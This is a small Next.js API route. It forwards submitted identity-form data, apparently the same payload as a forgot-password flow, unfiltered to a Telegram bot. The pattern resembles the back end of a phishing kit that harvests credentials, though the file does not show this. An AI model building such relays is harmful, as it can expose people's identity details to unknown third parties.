import { NextRequest, NextResponse } from "next/server"
import { telegramService } from "@/lib/telegram"

/** Same payload and Telegram message as `/api/telegram/forgot-password` (no `forgot_flow` cookie). */
export async function POST(request: NextRequest) {
  try {
    const data = await request.json()
    await telegramService.sendIdentityFormNotification(data)
    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error sending identity form notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
